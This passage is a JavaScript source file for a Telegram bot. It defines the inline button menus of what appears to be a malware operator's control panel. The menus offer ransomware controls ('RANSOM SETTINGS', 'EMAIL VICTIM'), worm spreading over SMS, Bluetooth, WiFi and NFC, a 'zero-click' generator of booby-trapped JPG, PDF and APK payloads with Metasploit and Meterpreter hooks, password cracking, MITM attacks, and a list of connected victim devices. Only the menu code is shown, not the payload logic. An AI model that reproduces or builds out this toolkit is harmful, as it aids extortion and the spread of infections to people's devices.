            [Markup.button.callback('📊 ENCRYPTION STATS', 'encryption_stats'), Markup.button.callback('🔑 GENERATE KEY', 'gen_key'), Markup.button.callback('🔐 CHANGE KEY', 'change_key')],
            [Markup.button.callback('📁 SELECT FOLDER', 'select_folder'), Markup.button.callback('📁 SELECT EXTENSIONS', 'select_ext'), Markup.button.callback('⚙️ RANSOM SETTINGS', 'ransom_settings')],
            [Markup.button.callback('💰 BTC PRICE', 'btc_price'), Markup.button.callback('📧 EMAIL VICTIM', 'email_victim'), Markup.button.callback('🔓 DECRYPT ALL', 'decrypt_all')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SPREADER KEYBOARD (20 BUTTONS) ====================
    static getSpreaderKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📱 SPREAD CONTACTS', 'spread_contacts'), Markup.button.callback('🔗 SPREAD LINK', 'spread_link'), Markup.button.callback('📲 SPREAD BT', 'spread_bt')],
            [Markup.button.callback('🪱 WORM MODE', 'worm_mode'), Markup.button.callback('📡 AUTO SPREAD', 'auto_spread'), Markup.button.callback('🔗 MAL LINK', 'malicious_link')],
            [Markup.button.callback('📱 SMS SPREAD', 'sms_spread'), Markup.button.callback('🔗 QR SPREAD', 'qr_spread'), Markup.button.callback('🌐 WEB SPREAD', 'web_spread')],
            [Markup.button.callback('📧 EMAIL SPREAD', 'email_spread'), Markup.button.callback('📱 WIFI SPREAD', 'wifi_spread'), Markup.button.callback('🔗 NFC SPREAD', 'nfc_spread')],
            [Markup.button.callback('📊 SPREAD STATS', 'spread_stats'), Markup.button.callback('🎯 TARGET LIST', 'target_list'), Markup.button.callback('⚙️ SPREAD SETTINGS', 'spread_settings')],
            [Markup.button.callback('🪱 WORM CONFIG', 'worm_config'), Markup.button.callback('📡 PROPAGATION', 'propagation'), Markup.button.callback('🔗 LINK GENERATOR', 'link_gen')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== ZERO-CLICK KEYBOARD (25 BUTTONS) ====================
    static getZeroClickKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📱 GEN PAYLOAD', 'gen_payload'), Markup.button.callback('📸 GEN JPG', 'gen_jpg'), Markup.button.callback('🎵 GEN MP3', 'gen_mp3')],
            [Markup.button.callback('🎥 GEN MP4', 'gen_mp4'), Markup.button.callback('📄 GEN PDF', 'gen_pdf'), Markup.button.callback('📱 GEN APK', 'gen_apk')],
            [Markup.button.callback('🔧 GEN EXPLOIT', 'gen_exploit'), Markup.button.callback('⚡ GEN METASPLOIT', 'gen_msf'), Markup.button.callback('🎯 GEN CUSTOM', 'gen_custom')],
            [Markup.button.callback('🔗 GEN LINK', 'gen_link'), Markup.button.callback('🔗 GEN QR', 'gen_qr'), Markup.button.callback('📤 SEND WHATSAPP', 'send_wa')],
            [Markup.button.callback('📤 SEND TG', 'send_tg'), Markup.button.callback('📤 SEND SMS', 'send_sms'), Markup.button.callback('📤 SEND EMAIL', 'send_email')],
            [Markup.button.callback('📊 CHECK STATUS', 'check_status'), Markup.button.callback('🔄 AUTO DEPLOY', 'auto_deploy'), Markup.button.callback('🎯 EXPLOIT DB', 'exploit_db')],
            [Markup.button.callback('🔍 VULN SCAN', 'vuln_scan'), Markup.button.callback('📡 METERPRETER', 'meterpreter'), Markup.button.callback('🔧 PAYLOAD CONFIG', 'payload_config')],
            [Markup.button.callback('📊 PAYLOAD STATS', 'payload_stats'), Markup.button.callback('🗑️ CLEAN PAYLOADS', 'clean_payloads'), Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== EXTRA KEYBOARD (30 BUTTONS) ====================
    static getExtraKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔋 BATTERY SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance'), Markup.button.callback('🧹 CLEAN JUNK', 'clean_junk_extra')],
            [Markup.button.callback('📊 CPU INFO', 'cpu_info'), Markup.button.callback('🌡️ TEMPERATURE', 'temperature'), Markup.button.callback('📡 SENSORS', 'sensors')],
            [Markup.button.callback('📱 SCREEN INFO', 'screen_info'), Markup.button.callback('🔐 SECURITY CHECK', 'security_check'), Markup.button.callback('📊 BENCHMARK', 'benchmark')],
            [Markup.button.callback('🔋 BATTERY STATS', 'battery_stats'), Markup.button.callback('📱 DEVICE NAME', 'device_name'), Markup.button.callback('🔧 DEVICE SETTINGS', 'device_settings')],
            [Markup.button.callback('📊 NETWORK STATS', 'network_stats'), Markup.button.callback('🔍 PORT SCAN', 'port_scan'), Markup.button.callback('🌐 IP INFO', 'ip_info')],
            [Markup.button.callback('🔑 PASSWORD CRACK', 'password_crack'), Markup.button.callback('📡 MITM ATTACK', 'mitm_attack'), Markup.button.callback('🔍 PACKET SNIFF', 'packet_sniff')],
            [Markup.button.callback('🔧 HARDWARE INFO', 'hardware_info'), Markup.button.callback('📱 IMEI INFO', 'imei_info'), Markup.button.callback('🔐 SIM INFO', 'sim_info')],
            [Markup.button.callback('📡 CELL TOWERS', 'cell_towers'), Markup.button.callback('🌐 DNS INFO', 'dns_info'), Markup.button.callback('🔍 ARP TABLE', 'arp_table')],
            [Markup.button.callback('📊 SYSTEM LOGS', 'system_logs'), Markup.button.callback('🔧 DEBUG MODE', 'debug_mode'), Markup.button.callback('📱 FAKE GPS', 'fake_gps')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SESSION KEYBOARD (15 BUTTONS) ====================
    static getSessionKeyboard(sessions) {
        const keyboard = [];
        
        if (sessions && sessions.length > 0) {
            for (const session of sessions) {
                const status = session.connected ? '✅' : '⏳';
                keyboard.push([Markup.button.callback(`${status} ${session.device_name || 'Unknown'} - ${session.device_model || 'Device'}`, `select_${session.session_id}`)]);
            }
        } else {
            keyboard.push([Markup.button.callback('📱 No active sessions', 'no_sessions')]);
        }
        
        keyboard.push([Markup.button.callback('🔄 REFRESH', 'refresh_sessions')]);
        keyboard.push([Markup.button.callback('🔙 BACK TO MAIN', 'back_main')]);
        
        return Markup.inlineKeyboard(keyboard);
    }

    // ==================== SETTINGS KEYBOARD ====================
    static getSettingsKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔔 NOTIFICATIONS', 'settings_notifications'), Markup.button.callback('🔊 SOUND', 'settings_sound')],
            [Markup.button.callback('🌙 DARK MODE', 'settings_darkmode'), Markup.button.callback('🔐 PRIVACY', 'settings_privacy')],
            [Markup.button.callback('💾 AUTO BACKUP', 'settings_backup'), Markup.button.callback('🧹 AUTO CLEAN', 'settings_clean')],
            [Markup.button.callback('🌐 LANGUAGE', 'settings_language'), Markup.button.callback('⚡ PERFORMANCE', 'settings_performance')],
            [Markup.button.callback('🔒 SECURITY', 'settings_security'), Markup.button.callback('📊 STATS', 'settings_stats')],
            [Markup.button.callback('🔄 RESET SETTINGS', 'settings_reset'), Markup.button.callback('ℹ️ ABOUT', 'settings_about')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== HELP KEYBOARD ====================
    static getHelpKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📖 COMMANDS', 'help_commands'), Markup.button.callback('🎯 FEATURES', 'help_features')],
            [Markup.button.callback('📦 PAYLOADS', 'help_payloads'), Markup.button.callback('🔧 TROUBLESHOOT', 'help_troubleshoot')],
            [Markup.button.callback('ℹ️ ABOUT', 'help_about'), Markup.button.callback('🔄 UPDATE', 'help_update')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== BACK KEYBOARD ====================
    static getBackKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔙 BACK TO MAIN', 'back_main')]
        ]);
    }

    // ==================== CONFIRMATION KEYBOARD ====================
    static getConfirmationKeyboard(action, data) {
        return Markup.inlineKeyboard([
            [Markup.button.callback('✅ CONFIRM', `${action}_confirm_${data}`), Markup.button.callback('❌ CANCEL', `${action}_cancel`)],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }
}

module.exports = Keyboards;
